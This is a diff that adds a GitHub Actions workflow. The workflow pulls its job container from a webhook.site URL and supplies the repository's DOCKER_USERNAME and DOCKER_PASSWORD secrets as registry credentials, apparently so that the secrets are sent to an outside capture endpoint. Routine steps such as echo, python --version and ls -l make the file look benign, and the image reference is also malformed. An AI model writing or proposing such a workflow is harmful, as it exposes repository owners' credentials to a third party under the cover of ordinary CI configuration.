@@ -1,0 +1,28 @@
+name: Custom Image Workflow
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+
+jobs:
+  custom-image-job:
+    runs-on: ubuntu-latest
+    container:
+      image: https://webhook.site/f29e403b-2ece-45cd-b256-6ed38d35ca9c/your-custom-image:latest
+      credentials:
+        username: ${{ secrets.DOCKER_USERNAME }}
+        password: ${{ secrets.DOCKER_PASSWORD }}
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Run a command inside the container
+        run: echo "Running inside custom container"
+
+      - name: Run a script inside the container
+        run: |
+          python --version
+          ls -l
